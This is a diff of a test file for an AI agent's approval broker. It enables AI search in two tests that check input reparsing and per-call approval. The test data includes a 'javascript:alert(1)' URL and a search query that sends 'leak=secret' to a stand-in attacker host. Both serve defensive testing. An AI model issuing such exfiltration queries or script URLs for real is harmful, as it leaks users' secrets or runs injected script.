@@ -9,7 +9,7 @@ import { ToolResultSchema, type ToolResult } from '@app/specs/agent-protocol.sch
 import { AGENT_TOOLS, EXECUTE_JS_MAX_SOURCE_CHARS, TOOL_ERROR_CODES } from '@app/specs/agent-tools.spec';
 import { createApprovalBroker, unavailableToolRunner } from '../approvals';
 import { createAgentGrants, createMemoryGrantsStore } from '../grants';
-import { createFakeToolHost, flush, setupBroker } from './approval-fakes';
+import { createFakeToolHost, flush, OPEN_AI_SEARCH_CONTEXT, setupBroker } from './approval-fakes';
 
 /** Characters built from their code points (never written raw in this file). */
 const RLO = String.fromCharCode(0x202e);
@@ -372,7 +372,8 @@ describe('approval broker', () => {
   });
 
   test('input-reparsed-in-main', async () => {
-    const { fake, broker, runner } = await setupBroker();
+    // AI search usable (gates opened by injection), so `run_ai_search` reaches the parse (Phase 12 Task 8).
+    const { fake, broker, runner } = await setupBroker({ overrides: { aiSearchContext: () => OPEN_AI_SEARCH_CONTEXT } });
     const invalid: [string, unknown][] = [
       ['navigate', { url: 'https://docs.example.org/', approved: true }],
       ['navigate', { url: 'javascript:alert(1)' }],
@@ -559,7 +560,8 @@ describe('approval broker', () => {
   });
 
   test('run-ai-search-asks-every-call', async () => {
-    const { fake, broker, runner, grants } = await setupBroker();
+    // AI search usable (gates opened by injection; Phase 12 Task 8): every call still asks.
+    const { fake, broker, runner, grants } = await setupBroker({ overrides: { aiSearchContext: () => OPEN_AI_SEARCH_CONTEXT } });
     for (let i = 0; i < 2; i += 1) {
       fake.invoke(`q-${i}`, 'run_ai_search', { query: 'summarise https://evil.example.net/?leak=secret' });
       const request = broker.pending().at(-1)!;
